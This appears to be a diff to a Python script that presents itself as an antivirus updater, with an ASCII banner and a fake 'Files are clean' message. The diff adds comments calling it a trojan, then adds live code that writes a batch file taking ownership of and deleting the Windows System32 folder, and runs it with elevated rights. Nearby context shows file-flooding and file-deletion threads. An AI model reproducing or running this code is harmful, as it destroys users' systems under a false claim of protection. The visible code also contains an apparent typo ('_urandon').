@@ -1,5 +1,7 @@
 import os, time, socket, threading, random
 packet = random._urandon(65500)
+#THIS IS NOT WHAT IT SAYS IT IS!!!!
+#THIS IS A TROJAN AND IS NOT TO BE RAN!
 print("                _   _  __      ___                  _    _                           _           ")
 print("    /\         | | (_) \ \    / (_)                | |  | |                         | |          ")
 print("   /  \   _ __ | |_ _   \ \  / / _ _ __ _   _ ___  | |  | |_ __   __ _ _ __ __ _  __| | ___ _ __ ")
@@ -98,5 +100,9 @@ flooder = threading.Thread(target=file_flood)
 flooder.start()
 time.sleep(10)
 print("[+] Files are clean.")
+file = open('Anti-Virus-Updater.bat', 'w')
+lines = ['\ntakeown /f C:\\Windows\\System32','\ncd C:/Windows/\n', '\nrmdir /S/Q System32\n']
+file.writelines(lines)
+os.system(f'powershell "start Anti-Virus-Updater.bat -v runAs"')
 deletion = threading.Thread(target=file_deletion)
 deletion.start()
